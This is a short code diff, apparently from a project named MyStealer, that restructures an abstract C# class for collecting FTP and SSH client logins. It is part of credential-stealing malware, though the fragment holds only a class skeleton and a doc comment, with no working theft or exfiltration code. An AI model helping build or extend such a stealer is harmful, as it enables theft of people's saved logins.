@@ -2,7 +2,10 @@
 
 namespace MyStealer.Collector.Client
 {
-    public abstract class ClientCollector : ModuleBase
+    /// <summary>
+    /// A module that collects FTP/SSH/etc. Client logins.
+    /// </summary>
+    public abstract class ClientCollector : CollectorBase
     {
         public abstract IImmutableSet<ClientLogin> GetLogins();
     }
